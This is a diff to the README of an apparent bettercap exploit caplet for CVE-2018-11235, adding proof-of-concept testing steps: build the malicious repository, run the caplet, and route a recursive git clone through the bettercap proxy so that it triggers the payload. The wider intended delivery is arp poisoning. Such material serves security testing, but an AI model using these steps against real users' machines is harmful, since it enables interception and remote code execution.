@@ -40,3 +40,19 @@ notify the user about http redirect.
 Finally - all the CVE-2018-11235 limitations apply - to get RCE the
 victim needs to have vulnerable git client **and** do a recursive
 git clone (or initialize the submodules afterwards).
+
+## POC testing 
+
+You can test the script yourself without arp poison:
+
+1. Setup vulnerable git on your system
+2. Fire the caplet (remember to run `./build_repo.sh` first!)
+3. On vulnerable system run: 
+
+```
+http_proxy=<ip address of bettercap machine><bettercap_http_port> git clone --recursive http://github.com/bettercap/bettercap /tmp/exploit
+```
+
+(**NOTE**: we are intentionally trying to clone via http on github)
+
+The clone should trigger the default payload.
